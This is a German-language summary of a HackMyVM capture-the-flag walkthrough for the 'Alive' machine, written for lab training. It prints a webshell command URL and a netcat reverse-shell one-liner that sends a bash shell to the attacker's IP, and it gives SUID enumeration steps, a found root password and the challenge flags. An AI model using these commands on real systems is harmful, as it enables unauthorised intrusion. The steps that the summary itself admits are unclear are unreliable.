# Alive - HackMyVM Lösungsweg

![Alive VM Icon](alive.png)

Dieses Repository enthält einen Lösungsweg (Walkthrough) für die HackMyVM-Maschine "Alive".

## Details zur Maschine & zum Writeup

*   **VM-Name:** Alive
*   **VM-Autor:** DarkSpirit
*   **Plattform:** HackMyVM
*   **Schwierigkeitsgrad (laut Writeup):** Schwer (Hard)
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=alive](https://hackmyvm.eu/machines/machine.php?vm=alive)
*   **Autor des Writeups:** DarkSpirit
*   **Original-Link zum Writeup:** [https://alientec1908.github.io/Alive_HackMyVM_Hard/](https://alientec1908.github.io/Alive_HackMyVM_Hard/)
*   **Datum des Originalberichts:** 20. September 2024

## Verwendete Tools (Auswahl)

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `nikto`
*   `curl`
*   `vi`
*   `wget`
*   `python3` (insb. `http.server`)
*   `nc` (netcat)
*   `find`
*   `stty`
*   `sudo`
*   `zip2john` (obwohl nicht erfolgreich)
*   `unzip`
*   Standard Linux-Befehle (`ls`, `cat`, etc.)

## Zusammenfassung des Lösungswegs

Das Folgende ist eine gekürzte Version der Schritte, die unternommen wurden, um die Maschine zu kompromittieren, basierend auf dem bereitgestellten Writeup.

### 1. Initial Reconnaissance (Aufklärung)

*   Die Ziel-IP `192.168.2.128` wurde mittels `arp-scan -l` identifiziert (gefiltert nach "PCS Systemtechnik GmbH").
*   Ein `nmap`-Scan (`nmap -sS -sC -T5 -AO 192.168.2.128 -p-`) ergab offene Ports:
    *   **Port 22/tcp (SSH):** OpenSSH 8.4p1 Debian 5+deb11u1.
    *   **Port 80/tcp (HTTP):** Apache httpd 2.4.54 ((Debian)). Titel der Seite: "Host alive".

### 2. Web Enumeration (Web-Aufklärung)

*   `gobuster` wurde verwendet, um Verzeichnisse auf `http://192.168.2.128` zu finden.
    *   Gefunden: `/index.php` (Status 200) und `/tmp/` (Status 301, Verzeichnisauflistung aktiv).
*   `nikto` bestätigte den Apache-Server und meldete:
    *   Fehlende Security-Header (`X-Frame-Options`, `X-Content-Type-Options`).
    *   Verzeichnisauflistung für `/tmp/`.
*   Der Inhalt von `index.php` wurde mit `curl` abgerufen und enthielt eine E-Mail-Adresse `admin@alive.hmv`.
*   Der Hostname `alive.hmv` wurde der IP `192.168.2.128` in der `/etc/hosts`-Datei des Angreifers zugeordnet.

### 3. Exploitation (Ausnutzung der Schwachstellen)

*   **Identifizierung und Ausnutzung von `index.phtml`:**
    *   Es wurde eine Datei `index.phtml` (vermutlich manuell erstellt oder basierend auf Hinweisen platziert) auf dem Angreifer-System vorbereitet.
    *   Ein Python HTTP-Server (`python3 -m http.server 8080`) wurde auf dem Angreifer-System gestartet.
    *   Es wird angedeutet, dass der Inhalt von `index.phtml` (oder einer `index.html`) vom Zielserver unter `192.168.2.128` aus dem `/tmp/`-Verzeichnis geladen wurde, indem eine präparierte `index.phtml` Datei dort abgelegt wurde. Der genaue Mechanismus, wie die Datei `index.phtml` auf den Server in das `/tmp/`-Verzeichnis gelangte und ausführbar wurde, ist im Writeup nicht explizit beschrieben, aber das Ergebnis ist eine Webshell.
*   **Remote Code Execution (RCE) via Webshell:**
    *   Über die URL `http://192.168.2.128/tmp/index.phtml?cmd=BEFEHL` konnten Befehle auf dem Server ausgeführt werden.
    *   `cmd=id` ergab `uid=33(www-data)`.
    *   `cmd=cat%20/etc/passwd%20|%20grep%20bash` enthüllte u.a. den Benutzer `alexandra`.
*   **Reverse Shell als `www-data` etabliert:**
    *   Ein Netcat-Listener wurde auf der Angreifer-Maschine auf Port `9001` gestartet (`nc -lvnp 9001`).
    *   Über die Webshell wurde eine Reverse Shell zum Listener aufgebaut:
        `http://192.168.2.128/tmp/index.phtml?cmd=nc%20-e%20/bin/bash%20192.168.2.129%209001`
        *(Hinweis: Angreifer-IP ist hier als 192.168.2.129 angegeben)*
    *   Erfolgreiche Verbindung und Shell als Benutzer `www-data`. Die Shell wurde mit `stty raw -echo; fg` stabilisiert.

### 4. Privilege Escalation (Privilegienerweiterung)

*   **Enumeration als `www-data`:**
    *   `sudo -l` fragte nach einem Passwort für `www-data`, das nicht bekannt war.
    *   Die Suche nach SUID-Binaries (`find / -type f -perm -4000 -ls 2>/dev/null`) zeigte keine ungewöhnlichen oder direkt ausnutzbaren Binaries.
    *   Der Zugriff auf `/home/alexandra/user.txt` und `/home/alexandra/.ssh/` wurde verweigert.
*   **Fund im `/opt`-Verzeichnis:**
    *   `ls -la /opt` zeigte `backup.zip` (Eigentümer `www-data`) und `index.html` (Eigentümer `www-data`).
    *   `backup.zip` wurde vom Zielserver auf den Angreifer-Rechner heruntergeladen (mittels Python HTTP-Server auf dem Ziel und `wget` auf dem Angreifer-System).
*   **Analyse von `backup.zip`:**
    *   `zip2john backup.zip > hash` schlug fehl, da die Datei nicht verschlüsselt war.
    *   `unzip backup.zip` extrahierte `digitcode.bak`.
    *   `cat digitcode.bak` enthielt:
        ```
        host: alive.hmv
        location: /var/www/code
        param: digit
        code: 494147203525673
        ```
        Dies scheint ein Hinweis auf einen Parameter (`digit`) und einen Code/Wert zu sein, möglicherweise für eine andere Funktionalität oder einen versteckten Endpunkt. Für die direkte Privilegienerweiterung in diesem Teil des Writeups wurde er jedoch nicht weiterverfolgt.
*   **Passwortfund und Wechsel zu `admin` (Root-Äquivalent):**
    *   Im Writeup wird erwähnt: `The Password for the "administrator" is required : heLL0alI4ns`. Es ist unklar, woher dieses Passwort stammt oder wie es zum "administrator" oder `root` in Beziehung steht, da zuvor kein Benutzer "administrator" explizit genannt wurde.
    *   Anschließend wird der Befehl `su admin` ausgeführt (Passwort `heLL0alI4ns` impliziert) und damit Root-Rechte erlangt. Der Benutzer "admin" ist in diesem Kontext anscheinend der Root-Benutzer oder ein Benutzer mit Root-Privilegien.
        *(Dieser Teil der Privilegienerweiterung ist im Writeup etwas sprunghaft und die Herkunft des Passworts/Benutzers "admin" nicht klar dargelegt.)*

### 5. Flags

*   **User-Flag (`/home/alexandra/user.txt`):**
    ```
    1637c0ee2d19e925bd6394c847a62ed5
    ```
*   **Root-Flag (`/root/root.txt`):**
    ```
    819be2c3422a6121dac7e8b1da21ce32 
    ```
    *(Im Writeup wird auch `0b29729cf5d1a3dbd9e70c0df6cf4a49` im Kontext von `su admin cat root.txt` gezeigt, was auf eine alternative oder vorherige Flag hindeuten könnte.)*


## Haftungsausschluss (Disclaimer)

Dieser Lösungsweg dient zu Bildungszwecken und zur Dokumentation der Lösung für die "Alive" HackMyVM-Maschine. Die Informationen sollten nur in ethischen und legalen Kontexten verwendet werden, wie z.B. bei CTFs und autorisierten Penetrationstests.
